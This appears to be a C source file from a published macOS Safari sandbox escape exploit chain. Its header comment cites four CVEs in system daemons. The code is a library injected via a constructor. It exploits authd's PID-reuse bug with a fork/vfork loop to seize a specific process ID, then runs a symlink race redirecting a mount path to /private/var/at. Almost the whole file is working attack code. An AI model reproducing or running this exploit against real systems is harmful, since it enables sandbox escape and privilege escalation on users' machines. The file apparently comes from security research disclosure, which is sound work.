// Exploit using following bugs to escape Safari sandbox:
//
// * CVE-2017-2533: TOCTOU in diskarbitrationd
// * CVE-2017-2535: PID reuse logic bug in authd
// * CVE-2017-2534: Arbitrary dylib loading in speechsynthesisd
// * CVE-2017-6977: NULL ptr dereference in nsurlstoraged
//
// by phoenhex team (niklasb & saelo)
//
// see LICENSE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <xpc/xpc.h>
#include <Security/Security.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/sysctl.h>
#include <pwd.h>
#include <mach/mach.h>

#include "workdir.h"
#include "common.h"
#include "proc.h"

pid_t token_pid;

int last_pid;
bool grab_loop(pid_t target) {
  assert(target);
  last_pid = -1;
  if (getpid() == target)
    return 1;
  for (;;) {
    pid_t res = vfork();
    if (res < 0) return 0;
    if (res > 0) last_pid = res;
    if (res == target) return 1;
    if (res == 0) _exit(0);
  }
  assert(0);
}

void grab(pid_t target) {
  for(int i = 0; ; ++i) {
    /*printf("Iteration %d\n", i);*/

    int res = fork();
    assert(res >= 0);
    if (res > 0) {
      // parent
      int status;
      waitpid(res, &status, 0);
      if (status == 0) return;
    } else {
      // child
      bool res = grab_loop(target);
      // kill zombies
      waitpid(-1,0,0);
      /*printf("Progress: %d / %d\n", last_pid, target);*/
      _exit(res ? 0 : 1);
    }
  }
}

void symlink_race() {
  for(;;) {
    int f = open("stop_mount_race", 0);
    if (f >= 0) {
      log("Done\n");
      close(f);
      return;
    }
    //log("Another round\n");
    for(int i = 0; i < 100; ++i) {
      unlink("pwn");
      symlink("mnt", "pwn");
      unlink("pwn");
      symlink("/private/var/at", "pwn");
    }
  }
}

__attribute__((constructor))
void _injection() {
  chdir(workdir);
  init("ssd2");

  int f1 = wait_for_file("token_pid");
  readall(f1, (char*)&token_pid, sizeof token_pid, true);

  log("token_pid = %d\n", token_pid);
  assert(!get_process_list());
  assert(!have_pid(token_pid));

  // TODO find good compromise here between speed and reliability
  const int holes = 3;
  pid_t target = token_pid;
  int seen = 0;
  while (seen < holes) {
    --target;
    seen += !have_pid(target);
  }
  assert(target > 10);

  log("Grabbing PID %d\n", target);
  grab(target);

  assert(!get_process_list());
  assert(!have_pid(token_pid));
  write_marker("hole_done");

  log("Done. Waiting for mount race to start.\n");

  int fd = wait_for_file("ssd2_next_step");
  log("Reading step file\n");
  char step[10] = {0};
  readall(fd, step, 4, true);
  log("Next step: %s.\n", step);
  write_marker("ssd2_next_step_ack");
  if (!strncmp(step, "exit", 4)) {
    log("Exiting without starting race.\n");
    _exit(0);
  }

  log("Starting race\n");
  symlink_race();
  log("Done. Cya\n");
  _exit(0);
}
